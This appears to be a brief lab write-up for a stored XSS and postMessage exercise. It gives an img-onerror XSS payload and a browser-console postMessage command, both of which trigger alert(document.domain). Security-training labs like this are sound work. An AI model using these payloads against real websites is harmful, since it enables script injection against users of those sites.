# Stored XSS and postMessage

This lab is for postMessage and xss Vulnerability.

## WriteUp

xss : "  ` <img src=z onerror=alert(document.domain)> ` "
postMessage : 

Open instect tab then goto debugger tab and open console there    
by pressing Esc key

then type payload : `window.postMessage('alert(document.domain)', '*') `
For XSS
